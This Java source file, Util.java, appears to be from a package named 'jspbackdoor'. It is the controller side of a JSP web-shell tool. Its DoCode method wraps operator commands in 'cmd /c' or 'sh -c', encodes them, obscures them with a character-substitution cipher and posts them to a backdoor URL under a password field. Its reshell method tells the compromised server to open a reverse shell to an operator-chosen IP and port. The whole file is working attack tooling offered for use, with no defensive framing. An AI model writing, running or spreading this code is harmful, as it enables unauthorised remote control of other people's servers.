package com.weiwhy.jspbackdoor;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.List;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Util {
	private static OkHttpClient okHttpClient
	=new OkHttpClient.Builder().build();
	public static String Readtext(String name) {
		try {
			BufferedReader bufferedReader = new BufferedReader(new FileReader(new File(name)));
			StringBuffer data=new StringBuffer();
			String tmp="";
			while ((tmp = bufferedReader.readLine()) != null) {
				data.append(tmp+"\n");
			}
			bufferedReader.close();
			return data.toString();
		} catch (Exception e) {
			System.out.println(e.getMessage());
			return "";
		}
	}
	
	public static String DoCode(String pfm,List<String> cmdlist) {
		String cmd="";
		for (int i = 1; i < cmdlist.size(); i++) {
			cmd=cmd+cmdlist.get(i)+" ";
		}
		switch (pfm) {
		case "win":
			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "cmd /c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
			return res;
		case "unix":
			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.cmd.replace("%cmd%", "sh -c "+cmd).getBytes())), Main.key, Main.words), Main.key, Main.words);
			return res2;
		default:
			return "";
		}
	}
	public static String reshell(String pfm,List<String> cmdlist) {
		String exec="";
		String ip=cmdlist.get(1);
		String port=cmdlist.get(2);
		switch (pfm) {
		case "win":
			exec="cmd.exe";
			String res=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
			return res;
		case "unix":
			exec="/bin/sh";
			String res2=Util.GetResponseString(Main.pass, Main.url, Util.EnChar(new String(Main.encoder.encode(Main.shell.replace("%cmd1%", exec).replace("%cmd2%", ip).replace("%cmd3%", port).getBytes())), Main.key, Main.words), Main.key, Main.words);
			return res2;
		default:
			return "fail";
		}
	}
	public static String EnChar(String content,String key,String words) {
		for (int i = 0; i <key.length(); i++) {
			content=content.replace(words.substring(i,i+1), key.substring(i,i+1));
		}
		return content;
	}
	
	
	public static String DeChar(String content,String key,String words) {
		for (int i = 0; i <key.length(); i++) {
			content=content.replace(key.substring(i,i+1),words.substring(i,i+1));
		}
		return content;
	}
	public static String GetResponseString(String pass,String url,String content,String key,String words) {
		FormBody.Builder formbuild=new FormBody.Builder();
		formbuild.add(pass, content);
		formbuild.add("key", key);
		formbuild.add("words", words);
		
		Request request = new Request.Builder()
				.url(url)
				.post(formbuild.build())
				.build();
		Response response;
		try {
			response = okHttpClient.newCall(request).execute();
			return response.body().string();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return "fail";
		}
	}
	
	public static int GetStatuscode(String pass,String url,String content,String key,String words) {
		FormBody.Builder formbuild=new FormBody.Builder();
		formbuild.add(pass, content);
		formbuild.add("key", key);
		formbuild.add("words", words);
		
		Request request = new Request.Builder()
				.url(url)
				.post(formbuild.build())
				.build();
		Response response;
		try {
			response = okHttpClient.newCall(request).execute();
			response.body();
			return response.code();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return 404;
		}
	}
}
